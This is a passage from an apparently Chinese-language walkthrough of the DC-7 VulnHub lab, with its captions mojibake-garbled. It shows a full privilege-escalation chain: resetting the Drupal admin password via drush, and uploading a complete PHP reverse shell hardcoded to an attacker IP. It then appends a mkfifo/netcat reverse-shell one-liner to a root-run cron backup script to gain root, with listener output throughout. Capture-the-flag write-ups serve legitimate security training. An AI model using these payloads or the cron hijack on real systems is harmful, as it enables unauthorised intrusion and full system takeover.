<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dc7user@dc-7:~$ <span class="built_in">cd</span> /var/mail</span><br><span class="line">dc7user@dc-7:/var/mail$ ls</span><br><span class="line">dc7user</span><br><span class="line">dc7user@dc-7:/var/mail$ cat dc7user </span><br><span class="line">From root@dc-7 Fri Aug 28 20:00:13 2020</span><br><span class="line">Return-path: &lt;root@dc-7&gt;</span><br><span class="line">Envelope-to: root@dc-7</span><br><span class="line">Delivery-date: Fri, 28 Aug 2020 20:00:13 +1000</span><br><span class="line">Received: from root by dc-7 with <span class="built_in">local</span> (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-7&gt;)</span><br><span class="line">        id 1kBbB7-0000HQ-RB</span><br><span class="line">        <span class="keyword">for</span> root@dc-7; Fri, 28 Aug 2020 20:00:13 +1000</span><br><span class="line">From: root@dc-7 (Cron Daemon)</span><br><span class="line">To: root@dc-7</span><br><span class="line">Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">X-Cron-Env: &lt;PATH=/bin:/usr/bin:/usr/<span class="built_in">local</span>/bin:/sbin:/usr/sbin&gt;</span><br><span class="line">X-Cron-Env: &lt;SHELL=/bin/sh&gt;</span><br><span class="line">X-Cron-Env: &lt;HOME=/root&gt;</span><br><span class="line">X-Cron-Env: &lt;LOGNAME=root&gt;</span><br><span class="line">Message-Id: &lt;E1kBbB7-0000HQ-RB@dc-7&gt;</span><br><span class="line">Date: Fri, 28 Aug 2020 20:00:13 +1000</span><br><span class="line"></span><br><span class="line">rm: cannot remove <span class="string">&#x27;/home/dc7user/backups/*&#x27;</span>: No such file or directory</span><br><span class="line">Database dump saved to /home/dc7user/backups/website.sql               [success]</span><br><span class="line"></span><br><span class="line">From root@dc-7 Fri Aug 28 20:15:05 2020</span><br><span class="line">Return-path: &lt;root@dc-7&gt;</span><br><span class="line">Envelope-to: root@dc-7</span><br><span class="line">Delivery-date: Fri, 28 Aug 2020 20:15:05 +1000</span><br><span class="line">Received: from root by dc-7 with <span class="built_in">local</span> (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-7&gt;)</span><br><span class="line">        id 1kBbPV-0000I3-Sk</span><br><span class="line">        <span class="keyword">for</span> root@dc-7; Fri, 28 Aug 2020 20:15:05 +1000</span><br><span class="line">From: root@dc-7 (Cron Daemon)</span><br><span class="line">To: root@dc-7</span><br><span class="line">Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">X-Cron-Env: &lt;PATH=/bin:/usr/bin:/usr/<span class="built_in">local</span>/bin:/sbin:/usr/sbin&gt;</span><br><span class="line">X-Cron-Env: &lt;SHELL=/bin/sh&gt;</span><br><span class="line">X-Cron-Env: &lt;HOME=/root&gt;</span><br><span class="line">X-Cron-Env: &lt;LOGNAME=root&gt;</span><br><span class="line">Message-Id: &lt;E1kBbPV-0000I3-Sk@dc-7&gt;</span><br><span class="line">Date: Fri, 28 Aug 2020 20:15:05 +1000</span><br><span class="line"></span><br><span class="line">Database dump saved to /home/dc7user/backups/website.sql               [success]</span><br><span class="line"></span><br><span class="line">From root@dc-7 Fri Aug 28 20:30:06 2020</span><br><span class="line">Return-path: &lt;root@dc-7&gt;</span><br><span class="line">Envelope-to: root@dc-7</span><br><span class="line">Delivery-date: Fri, 28 Aug 2020 20:30:06 +1000</span><br><span class="line">Received: from root by dc-7 with <span class="built_in">local</span> (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-7&gt;)</span><br><span class="line">        id 1kBbe2-0000K5-2D</span><br><span class="line">        <span class="keyword">for</span> root@dc-7; Fri, 28 Aug 2020 20:30:06 +1000</span><br><span class="line">From: root@dc-7 (Cron Daemon)</span><br><span class="line">To: root@dc-7</span><br><span class="line">Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">X-Cron-Env: &lt;PATH=/bin:/usr/bin:/usr/<span class="built_in">local</span>/bin:/sbin:/usr/sbin&gt;</span><br><span class="line">X-Cron-Env: &lt;SHELL=/bin/sh&gt;</span><br><span class="line">X-Cron-Env: &lt;HOME=/root&gt;</span><br><span class="line">X-Cron-Env: &lt;LOGNAME=root&gt;</span><br><span class="line">Message-Id: &lt;E1kBbe2-0000K5-2D@dc-7&gt;</span><br><span class="line">Date: Fri, 28 Aug 2020 20:30:06 +1000</span><br><span class="line"></span><br><span class="line">Database dump saved to /home/dc7user/backups/website.sql               [success]</span><br><span class="line"></span><br><span class="line">dc7user@dc-7:/var/mail$</span><br></pre></td></tr></table></figure>

<p><code>æŸ¥çœ‹/opt/scripts/backups.shï¼Œå±ç»„ä¸ºwww-data</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dc7user@dc-7:~$ ls -l /opt/scripts/backups.sh </span><br><span class="line">-rwxrwxr-x 1 root www-data 520 Aug 29  2019 /opt/scripts/backups.sh</span><br><span class="line">dc7user@dc-7:~$ cat /opt/scripts/backups.sh      </span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">rm /home/dc7user/backups/*</span><br><span class="line"><span class="built_in">cd</span> /var/www/html/</span><br><span class="line">drush sql-dump --result-file=/home/dc7user/backups/website.sql</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">tar -czf /home/dc7user/backups/website.tar.gz html/</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz</span><br><span class="line">chown dc7user:dc7user /home/dc7user/backups/*</span><br><span class="line">rm /home/dc7user/backups/website.sql</span><br><span class="line">rm /home/dc7user/backups/website.tar.gz</span><br><span class="line">dc7user@dc-7:~$</span><br></pre></td></tr></table></figure>

<p><code>æŸ¥çœ‹drushå‚æ•°ï¼Œå‘ç°å®ƒå¯ä»¥ä¿®æ”¹drupalç”¨æˆ·å¯†ç </code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dc7user@dc-7:~$ drush | grep user</span><br><span class="line"> sanitize:user-fields  Sanitize string fields associated with the user.                                               </span><br><span class="line"> (sanitize-user-field                                                                                                 </span><br><span class="line">User commands: (user)</span><br><span class="line"> user-add-role (urol,  Add a role to the specified user accounts.                                    </span><br><span class="line"> user:add:role)                                                                                      </span><br><span class="line"> user-block (ublk,     Block the specified user(s).                                                  </span><br><span class="line"> user:block)                                                                                         </span><br><span class="line"> user-cancel (ucan,    Cancel a user account with the specified name.                                </span><br><span class="line"> user:cancel)                                                                                        </span><br><span class="line"> user-create (ucrt,    Create a user account with the specified name.                                </span><br><span class="line"> user:create)                                                                                        </span><br><span class="line"> user-information      Print information about the specified user(s).                                </span><br><span class="line"> user:information)                                                                                   </span><br><span class="line"> user-login (uli,      Display a one time login link <span class="keyword">for</span> the given user account (defaults to uid 1). </span><br><span class="line"> user:login)                                                                                         </span><br><span class="line"> user-password (upwd,  (Re)Set the password <span class="keyword">for</span> the user account with the specified name.            </span><br><span class="line"> user:password)                                                                                      </span><br><span class="line"> user-remove-role      Remove a role from the specified user accounts.                               </span><br><span class="line"> user:remove:role)                                                                                   </span><br><span class="line"> user-unblock (uublk,  Unblock the specified user(s).                                                </span><br><span class="line"> user:unblock)</span><br><span class="line">dc7user@dc-7:~$</span><br></pre></td></tr></table></figure>

<p><code>ä¿®æ”¹adminå¯†ç </code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dc7user@dc-7:~$ <span class="built_in">cd</span> /var/www/html/</span><br><span class="line">dc7user@dc-7:/var/www/html$ drush user-password admin --password=<span class="string">&quot;admin&quot;</span></span><br><span class="line">Changed password <span class="keyword">for</span> admin                                                                                                             [success]</span><br><span class="line">dc7user@dc-7:/var/www/html$ </span><br></pre></td></tr></table></figure>

<h2 id="0x07-ç™»å…¥"><a href="#0x07-ç™»å…¥" class="headerlink" title="0x07.ç™»å…¥"></a>0x07.ç™»å…¥</h2><p><code>å‘ç°å¯ä»¥å®‰è£…æ‰©å±•æ’ä»¶</code></p>
<img src="/2020/08/28/DC-7/image-20200828202529102.png" class>

<p><code>å®‰è£…phpæ‰©å±•æ’ä»¶</code><span class="exturl" data-url="aHR0cHM6Ly93d3cuZHJ1cGFsLm9yZy9wcm9qZWN0L3BocA==">å®‰è£…åœ°å€<i class="fa fa-external-link-alt"></i></span></p>
<img src="/2020/08/28/DC-7/image-20200828202838728.png" class>

<p><code>å‡ºç°ä¸‹å›¾å³ä¸ºæˆåŠŸ</code></p>
<img src="/2020/08/28/DC-7/image-20200828203016424.png" class>

<p><code>è¿™é‡Œä¸€å®šè¦å‹¾é€‰</code></p>
<img src="/2020/08/28/DC-7/image-20200828203116659.png" class>

<p><code>å®‰è£…</code></p>
<img src="/2020/08/28/DC-7/image-20200828203203476.png" class>

<p><code>ä¸‹å›¾å³ä¸ºæˆåŠŸ</code></p>
<img src="/2020/08/28/DC-7/image-20200828203241818.png" class>

<h2 id="0x07-åå¼¹shell"><a href="#0x07-åå¼¹shell" class="headerlink" title="0x07.åå¼¹shell"></a>0x07.åå¼¹shell</h2><h3 id="1-ç¼–å†™reverse-shell"><a href="#1-ç¼–å†™reverse-shell" class="headerlink" title="1.ç¼–å†™reverse-shell"></a>1.ç¼–å†™reverse-shell</h3><p><code>æœ¬æ¬¡ä½¿ç”¨/usr/share/webshells/php/php-reverse-shell.php</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// php-reverse-shell - A Reverse Shell implementation <span class="keyword">in</span> PHP</span><br><span class="line">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span><br><span class="line">//</span><br><span class="line">// This tool may be used <span class="keyword">for</span> legal purposes only.  Users take full responsibility</span><br><span class="line">// <span class="keyword">for</span> any actions performed using this tool.  The author accepts no liability</span><br><span class="line">// <span class="keyword">for</span> damage caused by this tool.  If these terms are not acceptable to you, <span class="keyword">then</span></span><br><span class="line">// <span class="keyword">do</span> not use this tool.</span><br><span class="line">//</span><br><span class="line">// In all other respects the GPL version 2 applies:</span><br><span class="line">//</span><br><span class="line">// This program is free software; you can redistribute it and/or modify</span><br><span class="line">// it under the terms of the GNU General Public License version 2 as</span><br><span class="line">// published by the Free Software Foundation.</span><br><span class="line">//</span><br><span class="line">// This program is distributed <span class="keyword">in</span> the hope that it will be useful,</span><br><span class="line">// but WITHOUT ANY WARRANTY; without even the implied warranty of</span><br><span class="line">// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span><br><span class="line">// GNU General Public License <span class="keyword">for</span> more details.</span><br><span class="line">//</span><br><span class="line">// You should have received a copy of the GNU General Public License along</span><br><span class="line">// with this program; <span class="keyword">if</span> not, write to the Free Software Foundation, Inc.,</span><br><span class="line">// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</span><br><span class="line">//</span><br><span class="line">// This tool may be used <span class="keyword">for</span> legal purposes only.  Users take full responsibility</span><br><span class="line">// <span class="keyword">for</span> any actions performed using this tool.  If these terms are not acceptable to</span><br><span class="line">// you, <span class="keyword">then</span> <span class="keyword">do</span> not use this tool.</span><br><span class="line">//</span><br><span class="line">// You are encouraged to send comments, improvements or suggestions to</span><br><span class="line">// me at pentestmonkey@pentestmonkey.net</span><br><span class="line">//</span><br><span class="line">// Description</span><br><span class="line">// -----------</span><br><span class="line">// This script will make an outbound TCP connection to a hardcoded IP and port.</span><br><span class="line">// The recipient will be given a shell running as the current user (apache normally).</span><br><span class="line">//</span><br><span class="line">// Limitations</span><br><span class="line">// -----------</span><br><span class="line">// proc_open and stream_set_blocking require PHP version 4.3+, or 5+</span><br><span class="line">// Use of stream_select() on file descriptors returned by proc_open() will fail and <span class="built_in">return</span> FALSE under Windows.</span><br><span class="line">// Some compile-time options are needed <span class="keyword">for</span> daemonisation (like pcntl, posix).  These are rarely available.</span><br><span class="line">//</span><br><span class="line">// Usage</span><br><span class="line">// -----</span><br><span class="line">// See http://pentestmonkey.net/tools/php-reverse-shell <span class="keyword">if</span> you get stuck.</span><br><span class="line"></span><br><span class="line">set_time_limit (0);</span><br><span class="line"><span class="variable">$VERSION</span> = <span class="string">&quot;1.0&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="string">&#x27;192.168.1.6&#x27;</span>;  // CHANGE THIS</span><br><span class="line"><span class="variable">$port</span> = 9001;       // CHANGE THIS</span><br><span class="line"><span class="variable">$chunk_size</span> = 1400;</span><br><span class="line"><span class="variable">$write_a</span> = null;</span><br><span class="line"><span class="variable">$error_a</span> = null;</span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&#x27;uname -a; w; id; /bin/sh -i&#x27;</span>;</span><br><span class="line"><span class="variable">$daemon</span> = 0;</span><br><span class="line"><span class="variable">$debug</span> = 0;</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">// Daemonise ourself <span class="keyword">if</span> possible to avoid zombies later</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line">// pcntl_fork is hardly ever available, but will allow us to daemonise</span><br><span class="line">// our php process and avoid zombies.  Worth a try...</span><br><span class="line"><span class="keyword">if</span> (function_exists(<span class="string">&#x27;pcntl_fork&#x27;</span>)) &#123;</span><br><span class="line">        // Fork and have the parent process <span class="built_in">exit</span></span><br><span class="line">        <span class="variable">$pid</span> = pcntl_fork();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$pid</span> == -1) &#123;</span><br><span class="line">                printit(<span class="string">&quot;ERROR: Can&#x27;t fork&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(1);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$pid</span>) &#123;</span><br><span class="line">                <span class="built_in">exit</span>(0);  // Parent exits</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // Make the current process a session leader</span><br><span class="line">        // Will only succeed <span class="keyword">if</span> we forked</span><br><span class="line">        <span class="keyword">if</span> (posix_setsid() == -1) &#123;</span><br><span class="line">                printit(<span class="string">&quot;Error: Can&#x27;t setsid()&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(1);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$daemon</span> = 1;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        printit(<span class="string">&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Change to a safe directory</span><br><span class="line"><span class="built_in">chdir</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"></span><br><span class="line">// Remove any <span class="built_in">umask</span> we inherited</span><br><span class="line"><span class="built_in">umask</span>(0);</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">// Do the reverse shell...</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line">// Open reverse connection</span><br><span class="line"><span class="variable">$sock</span> = fsockopen(<span class="variable">$ip</span>, <span class="variable">$port</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, 30);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$sock</span>) &#123;</span><br><span class="line">        printit(<span class="string">&quot;<span class="variable">$errstr</span> (<span class="variable">$errno</span>)&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Spawn shell process</span><br><span class="line"><span class="variable">$descriptorspec</span> = array(</span><br><span class="line">   0 =&gt; array(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;r&quot;</span>),  // stdin is a pipe that the child will <span class="built_in">read</span> from</span><br><span class="line">   1 =&gt; array(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>),  // stdout is a pipe that the child will write to</span><br><span class="line">   2 =&gt; array(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>)   // stderr is a pipe that the child will write to</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$process</span> = proc_open(<span class="variable">$shell</span>, <span class="variable">$descriptorspec</span>, <span class="variable">$pipes</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_resource(<span class="variable">$process</span>)) &#123;</span><br><span class="line">        printit(<span class="string">&quot;ERROR: Can&#x27;t spawn shell&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Set everything to non-blocking</span><br><span class="line">// Reason: Occsionally reads will block, even though stream_select tells us they won<span class="string">&#x27;t</span></span><br><span class="line"><span class="string">stream_set_blocking($pipes[0], 0);</span></span><br><span class="line"><span class="string">stream_set_blocking($pipes[1], 0);</span></span><br><span class="line"><span class="string">stream_set_blocking($pipes[2], 0);</span></span><br><span class="line"><span class="string">stream_set_blocking($sock, 0);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">printit(&quot;Successfully opened reverse shell to $ip:$port&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">while (1) &#123;</span></span><br><span class="line"><span class="string">        // Check for end of TCP connection</span></span><br><span class="line"><span class="string">        if (feof($sock)) &#123;</span></span><br><span class="line"><span class="string">                printit(&quot;ERROR: Shell connection terminated&quot;);</span></span><br><span class="line"><span class="string">                break;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        // Check for end of STDOUT</span></span><br><span class="line"><span class="string">        if (feof($pipes[1])) &#123;</span></span><br><span class="line"><span class="string">                printit(&quot;ERROR: Shell process terminated&quot;);</span></span><br><span class="line"><span class="string">                break;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        // Wait until a command is end down $sock, or some</span></span><br><span class="line"><span class="string">        // command output is available on STDOUT or STDERR</span></span><br><span class="line"><span class="string">        $read_a = array($sock, $pipes[1], $pipes[2]);</span></span><br><span class="line"><span class="string">        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        // If we can read from the TCP socket, send</span></span><br><span class="line"><span class="string">        // data to process&#x27;</span>s STDIN</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$sock</span>, <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$debug</span>) printit(<span class="string">&quot;SOCK READ&quot;</span>);</span><br><span class="line">                <span class="variable">$input</span> = fread(<span class="variable">$sock</span>, <span class="variable">$chunk_size</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$debug</span>) printit(<span class="string">&quot;SOCK: <span class="variable">$input</span>&quot;</span>);</span><br><span class="line">                fwrite(<span class="variable">$pipes</span>[0], <span class="variable">$input</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // If we can <span class="built_in">read</span> from the process<span class="string">&#x27;s STDOUT</span></span><br><span class="line"><span class="string">        // send data down tcp connection</span></span><br><span class="line"><span class="string">        if (in_array($pipes[1], $read_a)) &#123;</span></span><br><span class="line"><span class="string">                if ($debug) printit(&quot;STDOUT READ&quot;);</span></span><br><span class="line"><span class="string">                $input = fread($pipes[1], $chunk_size);</span></span><br><span class="line"><span class="string">                if ($debug) printit(&quot;STDOUT: $input&quot;);</span></span><br><span class="line"><span class="string">                fwrite($sock, $input);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        // If we can read from the process&#x27;</span>s STDERR</span><br><span class="line">        // send data down tcp connection</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$pipes</span>[2], <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$debug</span>) printit(<span class="string">&quot;STDERR READ&quot;</span>);</span><br><span class="line">                <span class="variable">$input</span> = fread(<span class="variable">$pipes</span>[2], <span class="variable">$chunk_size</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$debug</span>) printit(<span class="string">&quot;STDERR: <span class="variable">$input</span>&quot;</span>);</span><br><span class="line">                fwrite(<span class="variable">$sock</span>, <span class="variable">$input</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fclose(<span class="variable">$sock</span>);</span><br><span class="line">fclose(<span class="variable">$pipes</span>[0]);</span><br><span class="line">fclose(<span class="variable">$pipes</span>[1]);</span><br><span class="line">fclose(<span class="variable">$pipes</span>[2]);</span><br><span class="line">proc_close(<span class="variable">$process</span>);</span><br><span class="line"></span><br><span class="line">// Like <span class="built_in">print</span>, but does nothing <span class="keyword">if</span> we<span class="string">&#x27;ve daemonised ourself</span></span><br><span class="line"><span class="string">// (I can&#x27;</span>t figure out how to redirect STDOUT like a proper daemon)</span><br><span class="line"><span class="keyword">function</span> printit (<span class="variable">$string</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$daemon</span>) &#123;</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&quot;<span class="variable">$string</span>\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<img src="/2020/08/28/DC-7/image-20200828204106538.png" class>

<img src="/2020/08/28/DC-7/image-20200828204128295.png" class>

<h3 id="2-kaliç›‘å¬"><a href="#2-kaliç›‘å¬" class="headerlink" title="2.kaliç›‘å¬"></a>2.kaliç›‘å¬</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc7<span class="comment"># nc -nvlp 6666</span></span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="3-ä¿å­˜æµè§ˆ"><a href="#3-ä¿å­˜æµè§ˆ" class="headerlink" title="3.ä¿å­˜æµè§ˆ"></a>3.ä¿å­˜æµè§ˆ</h3><img src="/2020/08/28/DC-7/image-20200828214351504.png" class>

<h3 id="4-kali-get-shell"><a href="#4-kali-get-shell" class="headerlink" title="4.kali get shell"></a>4.kali get shell</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># nc -nvlp 9001</span></span><br><span class="line">listening on [any] 9001 ...</span><br><span class="line">connect to [192.168.1.6] from (UNKNOWN) [192.168.1.8] 39786</span><br><span class="line">Linux dc-7 4.9.0-9-amd64 <span class="comment">#1 SMP Debian 4.9.168-1+deb9u5 (2019-08-11) x86_64 GNU/Linux</span></span><br><span class="line"> 23:43:02 up  3:49,  0 users,  load average: 0.01, 0.02, 0.00</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$</span></span><br></pre></td></tr></table></figure>

<h3 id="5-å‡çº§shell"><a href="#5-å‡çº§shell" class="headerlink" title="5.å‡çº§shell"></a>5.å‡çº§shell</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">www-data@dc-7:/$ id</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">www-data@dc-7:/$ whoami</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line">www-data@dc-7:/$ </span><br></pre></td></tr></table></figure>

<h3 id="5-å‡çº§äº¤äº’shell"><a href="#5-å‡çº§äº¤äº’shell" class="headerlink" title="5.å‡çº§äº¤äº’shell"></a>5.å‡çº§äº¤äº’shell</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@dc-7:/$ ^Z</span><br><span class="line">[1]+  å·²åœæ­¢               nc -nvlp 9001</span><br><span class="line">root@JIYE:~<span class="comment"># stty raw -echo</span></span><br><span class="line">root@JIYE:~<span class="comment"># nc -nvlp 9001</span></span><br><span class="line"></span><br><span class="line">www-data@dc-7:/$ whoami</span><br><span class="line">www-data</span><br><span class="line">www-data@dc-7:/$</span><br></pre></td></tr></table></figure>

<h2 id="0x08-ææƒ"><a href="#0x08-ææƒ" class="headerlink" title="0x08.ææƒ"></a>0x08.ææƒ</h2><p><code>backupså…·æœ‰æ‰§è¡Œæƒé™ï¼Œæ‰€ä»¥åˆ©ç”¨ä»–ææƒ</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@dc-7:/var/mail$ <span class="built_in">cd</span> /opt/scripts/</span><br><span class="line">www-data@dc-7:/opt/scripts$ ls</span><br><span class="line">backups.sh</span><br><span class="line">www-data@dc-7:/opt/scripts$ </span><br><span class="line">www-data@dc-7:/opt/scripts$ ls -l backups.sh </span><br><span class="line">-rwxrwxr-x 1 root www-data 520 Aug 29  2019 backups.sh</span><br><span class="line">www-data@dc-7:/opt/scripts$</span><br></pre></td></tr></table></figure>

<p><code>ç¼–è¾‘æ–‡ä»¶</code><span class="exturl" data-url="aHR0cDovL3BlbnRlc3Rtb25rZXkubmV0L2NoZWF0LXNoZWV0L3NoZWxscy9yZXZlcnNlLXNoZWxsLWNoZWF0LXNoZWV0">å‚è€ƒ<i class="fa fa-external-link-alt"></i></span></p>
<blockquote>
<p>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.1.6 9002 &gt;/tmp/f</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@dc-7:/opt/scripts<span class="variable">$echo</span> <span class="string">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.1.6 9002 &gt;/tmp/f&quot;</span> &gt;&gt; backups.sh</span><br><span class="line">www-data@dc-7:/opt/scripts$ cat backups.sh </span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">rm /home/dc7user/backups/*</span><br><span class="line"><span class="built_in">cd</span> /var/www/html/</span><br><span class="line">drush sql-dump --result-file=/home/dc7user/backups/website.sql</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">tar -czf /home/dc7user/backups/website.tar.gz html/</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz</span><br><span class="line">chown dc7user:dc7user /home/dc7user/backups/*</span><br><span class="line">rm /home/dc7user/backups/website.sql</span><br><span class="line">rm /home/dc7user/backups/website.tar.gz</span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.1.6 9002 &gt;/tmp/f</span><br><span class="line">www-data@dc-7:/opt/scripts$</span><br></pre></td></tr></table></figure>

<p><code>kaliç›‘å¬</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># nc -nvlp 9002</span></span><br><span class="line">listening on [any] 9002 ...</span><br><span class="line">connect to [192.168.1.6] from (UNKNOWN) [192.168.1.8] 45590</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string"># python -c &#x27;</span>import pty;pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">root@dc-7:/var/www# cd</span></span><br><span class="line"><span class="string">cd</span></span><br><span class="line"><span class="string">root@dc-7:~# ls</span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">theflag.txt</span></span><br><span class="line"><span class="string">root@dc-7:~# cat theflag.txt </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">888       888          888 888      8888888b.                             888 888 888 888 </span></span><br><span class="line"><span class="string">888   o   888          888 888      888  &quot;Y88b                            888 888 888 888 </span></span><br><span class="line"><span class="string">888  d8b  888          888 888      888    888                            888 888 888 888 </span></span><br><span class="line"><span class="string">888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 </span></span><br><span class="line"><span class="string">888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;&quot;88b 888 &quot;88b d8P  Y8b 888 888 888 888 </span></span><br><span class="line"><span class="string">88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P </span></span><br><span class="line"><span class="string">8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      &quot;   &quot;   &quot;   &quot;  </span></span><br><span class="line"><span class="string">888P     Y888  &quot;Y8888  888 888      8888888P&quot;   &quot;Y88P&quot;  888  888  &quot;Y8888  888 888 888 888 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span 